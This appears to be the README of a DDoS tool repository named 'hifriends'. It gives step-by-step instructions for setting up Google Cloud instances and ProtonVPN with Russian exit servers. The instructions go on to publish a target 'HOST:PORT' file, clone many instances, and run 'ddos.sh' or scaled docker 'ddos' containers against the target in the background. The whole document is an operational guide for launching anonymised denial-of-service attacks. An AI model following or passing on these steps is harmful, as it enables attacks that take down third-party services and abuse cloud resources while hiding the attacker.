# hifriends

Instructions for Google cloud.

0. Register on google cloud(you wil have free 300$ there), protonvpn.

1. Create publiccaly accesible file with your targer (you can use same google account) with content "HOST:PORT"

1. Run `sudo bash install.sh` and follow instructions. When it comes to credentials enter not PROTON credentials, but openVpn one. See https://protonvpn.com/support/vpn-login/ , section "OpenVPN / IKEv2 credentials"

2. Create new machine image based on your instance.

3. Spin up as much instances as it is allowed for your protonvpn connections (for Plus subscription it is 10, for example)

4. On each instance run `sudo bash ddos.sh {FILE_URL form step#1} &`. Then disown

# UPDated manual

1. Install `docker` (`docker compose` should be included)
2. Clone repo
3. cd inside
4. run following command

```commandline
TARGET_FILE={public_file_with_targets} \
PROTONVPN_USERNAME={your_protonvpn_username} \
PROTONVPN_PASSWORD={your_protonvpn_password} \
PROTONVPN_SERVER=RU \
PROTONVPN_TIER={you_plan_tier} \
docker compose up -d --build
```
{you_plan_tier} - Proton VPN Tier (0=Free, 1=Basic, 2=Pro, 3=Visionary).
See https://tprasadtp.github.io/protonvpn-docker/#/README?id=environment-variables

If you have powerful machine, you can run several ddos containers by adding
option `--scale ddos=N`, where N - desired number of ddos containers 

 